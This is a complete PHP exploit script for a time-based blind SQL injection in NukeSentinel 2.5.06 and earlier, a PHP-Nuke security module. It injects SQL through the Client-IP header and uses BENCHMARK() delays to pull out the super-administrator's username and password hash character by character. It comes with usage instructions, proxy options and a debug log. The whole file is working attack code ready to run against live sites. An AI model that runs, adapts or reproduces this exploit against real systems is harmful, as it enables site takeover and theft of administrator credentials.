#!/usr/bin/php
<?php
/**
 * This file require the PhpSploit class.
 * If you want to use this class, the latest
 * version can be downloaded from acid-root.new.fr.
 **/
require("phpsploitclass.php");
error_reporting(E_ALL ^ E_NOTICE);

if($argc < 3)
{
print("
--  NukeSentinel <= 2.5.06 SQL Injection (mysql >= 4.0.24) Exploit  ---
-----------------------------------------------------------------------
PHP conditions: none
CMS conditions: disable_switch<=0 (module activated), track_active=1
       Credits: DarkFig <gmdarkfig@gmail.com>
           URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
  Usage: $argv[0] -url <> [Options]
 Params: -url       For example http://victim.com/webspell/ 
Options: -prefix    Table prefix (default=nuke)
         -debug     Debug mod activated (debug_ns.html)
         -truetime  Server response time which returns true
         -benchmark You can change the value used in benchmark()
         -proxy     If you wanna use a proxy <proxyhost:proxyport> 
         -proxyauth Basic authentification <proxyuser:proxypwd>
Example: $argv[0] -url http://localhost/phpnuke/ -debug
   Note: This exploit is based on the server response time
         If you have some problems use -debug, -benchmark, -truetime
-----------------------------------------------------------------------
");exit(1);
}

$url       = getparam("url",1);
$tblprfix  = (getparam("prefix")!="")    ? getparam("prefix") : 'nuke';
$debug     = (getparam("debug")!="")     ? 1 : 0;
$benchmark = (getparam("benchmark")!="") ? getparam("benchmark") : '100000000';
$proxy     = getparam("proxy");
$proxyauth = getparam("proxyauth");

$xpl = new phpsploit();
$xpl->agent('Mozilla Firefox');
$xpl->allowredirection(0);
$xpl->cookiejar(0);

if($proxy) $xpl->proxy($proxy);
if($proxyauth) $xpl->proxyauth($proxyauth);
if($debug) debug(1);

print "\nUsername: ";bruteforce('aid');
print "\nPassword: ";bruteforce('pwd');
exit(0);

function bruteforce($field)
{
        global $url,$xpl,$tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$c,$f,$dfield,$a,$result; 
        $a=0;$v='';$dfield=$field;
        
        if(eregi('a',$field)) { $b='-1';$c='127';} # aid charset
        else                  { $b='46';$c='70'; } # pwd charset
        
        while(TRUE)
        {
                $a++;
                for($e=$b;$e<=$c;$e++)
                {
                        $fak = rand(128,254).'.'
                              .rand(128,254).'.'
                              .rand(128,254).'.'
                              .rand(128,254);

                        if($e==$b) $f="TST";
                        elseif($e==($b+1)) $f="NULL";
                        else $f=$e;

                        # $db->sql_query("INSERT INTO `".$prefix."_nsnst_tracked_ips` (`user_id`, `username`, `date`,
                        # `ip_addr`, `ip_long`, `page`, `user_agent`, `refered_from`, `x_forward_for`, `client_ip`, `remote_addr`,
                        # `remote_port`, `request_method`, `c2c`) VALUES ('".$nsnst_const['ban_user_id']."', '$ban_username2',
                        # '".$nsnst_const['ban_time']."', '".$nsnst_const['remote_ip']."', '".$nsnst_const['remote_long']."',
                        # '$pg', '$user_agent', '$refered_from', '".$nsnst_const['forward_ip']."', '".$nsnst_const['client_ip']."',
                        # '".$nsnst_const['remote_addr']."', '".$nsnst_const['remote_port']."', '".$nsnst_const['request_method']."',
                        # '$c2c')");
                        #
                        $sql  = "(SELECT IF((SUBSTR(";
                        $sql .= ($f=="TST") ? "(SELECT 1)" : "(SELECT $field FROM ${tblprfix}_authors WHERE radminsuper=1)";
                        $sql .= ($f=="TST") ? ",1" : ",$a";
                        $sql .= ",1)=CHAR(";
                        $sql .= ($f=="TST") ? "49" : "$f";
                        $sql .= ")),BENCHMARK($benchmark,CHAR(66))";
                        $sql .= ",1)),1,1,1,1,1,1,1,1,1)/*";

                        $bef = time();
                        $xpl->reset("header");
                        
                        # 2.5.06 CHANGES (2007-03-02):
                        # + Corrected a problem causing valid ip users to be tagged as invalid users
                        # ...The old sploit will not work for this version but it's always vulnerable, you missed something.
                        #
                        # if(!ereg("^([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})", $nsnst_const['remote_ip']))
                        # {$nsnst_const['remote_ip'] = "none"; }
                        #
                        $xpl->addheader("Client-IP","$fak',$sql");
                        $xpl->get($url);
                        $aft = time();

                        if($f=="TST") $truetime=($aft-$bef);
                        if(getparam("truetime")!="") $truetime = getparam("truetime");
                        
                        if((($aft-$bef) >= $truetime) AND ($f != "TST")) $result='TRUE';
                        else $result='FALSE';
                        if($debug) debug();
                        
                        if($result=='TRUE')
                        {
                                if($f != "NULL")
                                {
                                        print strtolower(chr($f));
                                        $v .= chr($f);
                                        break;
                                }
                                else
                                {
                                        return $v;
                                }
                        }
                        
                        # Retry if no char found
                        if($f==$c) $a--;
                }
        }
}

function debug($first='')
{
        global $tblprfix,$truetime,$debug,$benchmark,$sql,$bef,$aft,$fak,$b,$c,$f,$dfield,$a,$result;
        if($first)
        {
                $handle = fopen("debug_ns.html","w+");
                $data = "<h1><div align='center'>NukeSentinel &lt;= 2.5.06 SQL Injection (Debug)</div></h1>
                <pre><table width='0' border='1' align='center' cellspacing='0'><tr>
                <td align='center'><b>REQUEST TIME</b></td>
                <td align='center'><b>RESPONSE TIME</b></td>
                <td align='center'><b>TRUETIME</b></td>
                <td align='center'><b>BENCHMARK</b></td>
                <td align='center'><b>RESULT</b></td>";
                # <td align='center'><b>IP</b></td>
                $data .= "<td align='center'><b>FIELD</b></td>
                <td align='center'><b>CHARSET</b></td>
                <td align='center'><b>SUBSTR()</b></td>
                <td align='center'><b>ORD()</b></td>
                <td align='center'><b>CHAR()</b></td>";
                fwrite($handle,$data);
                fclose($handle);
        }
        else
        {
                $handle = fopen("debug_ns.html","a");
                $data   = "<tr";
                $data  .= ($result=='TRUE') ? " bgcolor='#FFFF00'" : "";
                $data  .= ">
                <td align='center'>&nbsp;".htmlentities($bef)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($aft)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($truetime)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($benchmark)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($result)."&nbsp;</td>";
                # <td align='center'>&nbsp;".htmlentities($fak)."&nbsp;</td>
                $data .= "<td align='center'>&nbsp;".htmlentities($dfield)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities("$b-$c")."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($a)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities($f)."&nbsp;</td>
                <td align='center'>&nbsp;".htmlentities(chr($f))."&nbsp;</td></tr>";
                fwrite($handle,$data);
                fclose($handle);
        }
}

function getparam($param,$opt='')
{
        global $argv;
        foreach($argv as $value => $key)
        {
                if($key == '-'.$param) {
                   if(!empty($argv[$value+1])) return $argv[$value+1];
                   else return 1;
                }
        }
        if($opt) exit("\n-$param parameter required");
        else return;
}
?>